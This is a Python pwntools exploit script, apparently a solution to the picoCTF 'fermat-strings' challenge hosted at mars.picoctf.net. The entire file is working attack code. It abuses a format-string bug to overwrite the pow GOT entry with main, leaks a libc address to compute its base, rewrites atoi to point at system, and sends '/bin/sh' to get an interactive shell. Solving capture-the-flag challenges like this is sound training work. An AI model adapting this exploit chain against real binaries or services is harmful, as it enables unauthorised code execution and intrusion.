from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

r = remote('mars.picoctf.net', 31929)
#r = process('./fermat-strings_patched')
#r = gdb.debug('./fermat-strings_patched', 'b *0x4009d2 \n c')
e = ELF('./fermat-strings')
libc = ELF('./libc.so.6')

# %10$p for the start of our input
# %42$p for the other buffer 

# get a loop so we can do more stuff
fmt = fmtstr_payload(11, {e.got['pow']: e.sym['main']}, numbwritten=19+8)
payload = b'1'*8 + fmt
print(payload)
r.sendline(payload)
# leak libc base address
r.sendline(b'2! %109$p')

r.recvuntil(b'2! ')
libc_leak = int(r.recvline(), 16)
libc.address = libc_leak - (libc.sym['__libc_start_main'] + 243)
print(f'libc.address = {hex(libc.address)}')

fmt = fmtstr_payload(11, {e.got['atoi']: libc.sym['system']}, numbwritten=19+8)
payload = b'1'*8+fmt 
print(payload)
r.recvuntil(b'A: ')
r.sendline(payload)
r.sendline(b'2')

r.recvuntil(b'A: ')
r.sendline(b'/bin/sh')
r.sendline(b'2')

r.interactive()
